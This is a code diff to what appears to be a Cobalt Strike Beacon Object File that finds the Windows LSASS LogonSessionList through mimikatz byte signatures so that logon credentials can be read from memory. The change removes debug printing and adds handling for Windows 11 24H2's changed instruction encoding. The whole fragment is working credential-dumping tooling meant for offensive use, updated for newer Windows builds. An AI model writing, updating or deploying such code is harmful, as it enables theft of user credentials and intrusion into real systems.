@@ -86,7 +86,6 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
         return 0;
     }
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Found LogonSessionList signature at offset 0x%lx.\n", LogonSessionListSigOffset);
-    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] lsasrvImageBase=0x%llx TextBase=0x%llx\n", (DWORD64)lsasrvImageBase, (DWORD64)lsasrvTextBase);
 
     //
     // If we found the pattern we can proceed with getting the actual address
@@ -95,38 +94,44 @@ DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWO
     /* Get the full address where the mimikatz byte pattern was found */
     PBYTE LogonSessionList_PatternAddress = lsasrvTextBase + LogonSessionListSigOffset + LogonSessionList_OFFSET;
 
-    /* Dump 50 bytes starting at the pattern so offsets can be verified */
-    PBYTE dbgBase = lsasrvTextBase + LogonSessionListSigOffset;
-    for (int di = 0; di < 50; di += 10)
-    {
-        BeaconPrintf(CALLBACK_OUTPUT, "[DBG] +%02d: %02x %02x %02x %02x %02x  %02x %02x %02x %02x %02x\n",
-            di,
-            dbgBase[di+0], dbgBase[di+1], dbgBase[di+2], dbgBase[di+3], dbgBase[di+4],
-            dbgBase[di+5], dbgBase[di+6], dbgBase[di+7], dbgBase[di+8], dbgBase[di+9]);
-    }
-
     /*
         Now get the RIP offset from the pattern address so we can use it later.
         It may look like  "48 8d 0d 97 f8 01 00    lea rcx,[rip+0x1f897] # 0x1f89e"  and we want to get the 0x1f897
         The mimikatz offsets take us directly to the rip offset value we want to retrieve so we have to read 4 bytes forward and reverse the endianness
     */
-    INT32 LogonSessionList_RipOffset =
-        (LogonSessionList_PatternAddress[3] << 24) |
-        (LogonSessionList_PatternAddress[2] << 16) |
-        (LogonSessionList_PatternAddress[1] << 8) |
-        (LogonSessionList_PatternAddress[0]);
-
-    BeaconPrintf(CALLBACK_OUTPUT, "[DBG] OFFSET=%d RipOffset=0x%x (%d) Correction=%d\n",
-        LogonSessionList_OFFSET, (DWORD)LogonSessionList_RipOffset, LogonSessionList_RipOffset, RipCorrection);
-
-    /*
-        RIP-relative offsets are signed 32-bit displacements, sign-extended by the CPU.
-        Cast to INT32 so negative displacements (LogonSessionList below the instruction)
-        sign-extend correctly when added to the 64-bit PatternAddress.
-        RipCorrection is the distance from PatternAddress to the next instruction
-        (4 for a standard LEA; 9 for Win11 24H2's longer encoding).
-    */
-    DWORD64 Real_LogonSessionList_Address = LogonSessionList_PatternAddress + LogonSessionList_RipOffset + RipCorrection;
+    DWORD64 Real_LogonSessionList_Address;
+    if (RipCorrection == 0)
+    {
+        /*
+         * Win11 24H2 mode: the compiler optimised away the direct RIP-relative LEA to
+         * LogonSessionList.  Instead the code does:
+         *   lea r13, [rip - image_base_delta]   ; r13 = lsasrvImageBase
+         *   lea rdx, [r13 + fixed_offset]       ; rdx = LogonSessionList
+         * LogonSessionList_OFFSET points at the 4-byte fixed_offset in the second LEA.
+         * Formula: LogonSessionList = lsasrvImageBase + *(DWORD*)(pattern + OFFSET)
+         */
+        DWORD fixedOffset =
+            (LogonSessionList_PatternAddress[3] << 24) |
+            (LogonSessionList_PatternAddress[2] << 16) |
+            (LogonSessionList_PatternAddress[1] << 8) |
+            (LogonSessionList_PatternAddress[0]);
+        Real_LogonSessionList_Address = (DWORD64)lsasrvImageBase + fixedOffset;
+    }
+    else
+    {
+        /*
+         * Standard mode: a direct RIP-relative LEA loads LogonSessionList.
+         * The 4-byte signed displacement is at PatternAddress; RipCorrection is the
+         * number of bytes from PatternAddress to the next instruction (always 4 for a
+         * standard 7-byte LEA whose displacement is the last 4 bytes).
+         */
+        INT32 LogonSessionList_RipOffset =
+            (LogonSessionList_PatternAddress[3] << 24) |
+            (LogonSessionList_PatternAddress[2] << 16) |
+            (LogonSessionList_PatternAddress[1] << 8) |
+            (LogonSessionList_PatternAddress[0]);
+        Real_LogonSessionList_Address = LogonSessionList_PatternAddress + LogonSessionList_RipOffset + RipCorrection;
+    }
     DWORD64 LogonSessionListPA = 0;
     if (!TranslateUVA2Physical(Real_LogonSessionList_Address, &LogonSessionListPA, lower32bits, LsassPID))
     {
